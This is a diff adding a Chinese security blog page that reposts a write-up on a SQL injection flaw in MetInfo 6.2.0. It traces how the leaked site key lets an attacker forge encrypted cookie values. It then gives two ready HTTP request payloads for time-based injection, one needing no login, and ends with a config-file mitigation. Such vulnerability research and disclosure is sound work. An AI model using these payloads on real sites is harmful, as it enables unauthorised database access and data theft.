@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="metinfo 6.2.0最新版本前台注入漏洞https://nosec.org/home/detail/2436.htmlhttps://xz.aliyun.com/t/4508 漏洞环境：docker pull zksmile/vul:metinfov6.2.0 概述:看到某个表哥发的metinfo 6.1.3最新注入（https://xz.aliyun.com/t/4508)，以前我发过me">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metinfo 6.2.0最新版本前台注入漏洞">
+<meta property="og:url" content="http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="metinfo 6.2.0最新版本前台注入漏洞https://nosec.org/home/detail/2436.htmlhttps://xz.aliyun.com/t/4508 漏洞环境：docker pull zksmile/vul:metinfov6.2.0 概述:看到某个表哥发的metinfo 6.1.3最新注入（https://xz.aliyun.com/t/4508)，以前我发过me">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png">
+<meta property="og:updated_time" content="2019-12-06T17:54:31.101Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="metinfo 6.2.0最新版本前台注入漏洞">
+<meta name="twitter:description" content="metinfo 6.2.0最新版本前台注入漏洞https://nosec.org/home/detail/2436.htmlhttps://xz.aliyun.com/t/4508 漏洞环境：docker pull zksmile/vul:metinfov6.2.0 概述:看到某个表哥发的metinfo 6.1.3最新注入（https://xz.aliyun.com/t/4508)，以前我发过me">
+<meta name="twitter:image" content="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>metinfo 6.2.0最新版本前台注入漏洞</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2019/12/07/精品文章/ThinkPHP5.x 路由缺陷导致远程代码执行/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2019/12/07/精品文章/CVE-2017-7269 IIS6.0远程代码执行漏洞复现/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&text=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&is_video=false&description=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=metinfo 6.2.0最新版本前台注入漏洞&body=Check out this article: http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&name=metinfo 6.2.0最新版本前台注入漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&t=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞环境："><span class="toc-number">1.</span> <span class="toc-text">漏洞环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">2.</span> <span class="toc-text">概述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-number">3.</span> <span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.1.</span> <span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、不需要登陆"><span class="toc-number">3.1.1.</span> <span class="toc-text">1、不需要登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、-需要登陆"><span class="toc-number">3.1.2.</span> <span class="toc-text">2、 需要登陆</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">3.2.</span> <span class="toc-text">修复方案</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        metinfo 6.2.0最新版本前台注入漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-06T17:03:10.552Z" itemprop="datePublished">2019-12-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/漏洞/">漏洞</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>metinfo 6.2.0最新版本前台注入漏洞<br><a href="https://nosec.org/home/detail/2436.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2436.html</a><br><a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a></p>
+<h2 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h2><p>docker pull zksmile/vul:metinfov6.2.0</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述:"></a>概述:</h2><p>看到某个表哥发的metinfo 6.1.3最新注入（<a href="https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。</a></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>前台，（<a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a> ）作者在这里说需要注册会员，其实有一处不需要。漏洞详情<br>这里关键点在auth类的encode()和decode()方法。看下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class auth &#123;</span><br><span class="line">    </span><br><span class="line">    public $auth_key;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;auth_key = $_M[&apos;config&apos;][&apos;met_webkeys&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function decode($str, $key = &apos;&apos;)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;DECODE&apos;, $this-&gt;auth_key.$key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function encode($str, $key = &apos;&apos;, $time = 0)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;ENCODE&apos;, $this-&gt;auth_key.$key, $time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里两个方法全都调用了authcode()方法，跟进authcode看一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0)&#123;</span><br><span class="line">        $ckey_length = 4;  </span><br><span class="line">        $key = md5($key ? $key : UC_KEY);</span><br><span class="line">        $keya = md5(substr($key, 0, 16));</span><br><span class="line">        $keyb = md5(substr($key, 16, 16));</span><br><span class="line">        $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">        $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">        $key_length = strlen($cryptkey);</span><br><span class="line">        $string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;0d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">        $string_length = strlen($string);</span><br><span class="line">        $result = &apos;&apos;;</span><br><span class="line">        $box = range(0, 255);</span><br><span class="line">        $rndkey = array();</span><br><span class="line">        for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">            $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">        &#125;</span><br><span class="line">        for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">            $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">            $tmp = $box[$i];</span><br><span class="line">            $box[$i] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">            $a = ($a + 1) % 256;</span><br><span class="line">            $j = ($j + $box[$a]) % 256;</span><br><span class="line">            $tmp = $box[$a];</span><br><span class="line">            $box[$a] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">               return substr($result, 26);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               return &apos;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里decode和encode算法可逆，但我们需要知道$key的值，查看构造函数：<br>    public function __construct() {<br>        global $_M;<br>        $this-&gt;auth_key = $_M[‘config’][‘met_webkeys’];<br>    }<br>这里$key的值是来源于met_webkeys这个配置，查看met_webkeys来源发现在安装的时候把这个key写入到./config/config_safe.php文件中。<br><img src="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png" alt></p>
+<p>查看/config/config_safe.php文件，这里写入方式类似以下，但p牛在某篇文章中说过，这种是无法解析的，php后面必须要有一个空白字符，右键查看源代码即可得到met_webkeys，但有的会报错，根据这个表哥所说和php线程安全有关，本地试了下好像是这样。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png" alt></p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p>
+<p>这里有两个利用点，简单说下其中一个。在register类的doemailvild()方法中，这里把用户提交的p参数进行了解密，并且传入到了get_user_valid()方法中。<br><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p>
+<p>查看get_user_valid()方法，这里又把解密后的值传入到了get_user_by_username()方法。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png" alt></p>
+<p>查看get_user_by_username()方法，又传入了get_user_by_nameid()方法。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png" alt></p>
+<p>查看get_user_by_nameid()方法，直接拼接。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png" alt></p>
+<p>这里基本就清楚了，将auth类的authcode()方法copy本地。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png" alt></p>
+<p>访问本地文件得到加密后的字符串。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png" alt></p>
+<p>将加密后的字符串放到cookie，get或者post中，构造请求提交，延时注入成功。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>复现时需要注意的点：<br>1、php.ini中 short_open_tag=off</p>
+<p>2、不管需不需要登录，最起码需要网站有一个会员存在。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png" alt></p>
+<p>这里有两个，一个是不需要登陆就可注入，另一个是coolcat表哥所说的需要以会员登陆。以下请自行替换p参数。</p>
+<h4 id="1、不需要登陆"><a href="#1、不需要登陆" class="headerlink" title="1、不需要登陆"></a>1、不需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=register&amp;a=doemailvild HTTP/1.1<br>Cookie: p=00c7%2FDBwD23b41olxVCthTvDDTRBhldmrrdyA8S3t%2F3yAl4QZ0P%2FSfOS5zlB</p>
+<h4 id="2、-需要登陆"><a href="#2、-需要登陆" class="headerlink" title="2、 需要登陆"></a>2、 需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=profile&amp;a=dosafety_emailadd HTTP/1.1</p>
+<p>Cookie: p=497cD9UpkDtsvFzU9IKNlPvSyg1z%2bf09cmp8hqUeyJW9ekvPfJqx8cLKFSHr;&lt;自行添加登陆后的cookie&gt;</p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>目前官网没有更新相关补丁。<br>白帽汇安全研究院建议限制config_safe.php的访问权限来进行应急修复。<br>Apache配置.htaccess文件：</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png" alt></p>
+<p>Nginx在nginx.conf文件添加以下配置：</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png" alt></p>
+<p>文章转载于：<a href="http://zone.secevery.com/article/1058" target="_blank" rel="noopener">http://zone.secevery.com/article/1058</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞环境："><span class="toc-number">1.</span> <span class="toc-text">漏洞环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">2.</span> <span class="toc-text">概述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-number">3.</span> <span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.1.</span> <span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、不需要登陆"><span class="toc-number">3.1.1.</span> <span class="toc-text">1、不需要登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、-需要登陆"><span class="toc-number">3.1.2.</span> <span class="toc-text">2、 需要登陆</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">3.2.</span> <span class="toc-text">修复方案</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&text=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&is_video=false&description=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=metinfo 6.2.0最新版本前台注入漏洞&body=Check out this article: http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&title=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&name=metinfo 6.2.0最新版本前台注入漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/&t=metinfo 6.2.0最新版本前台注入漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
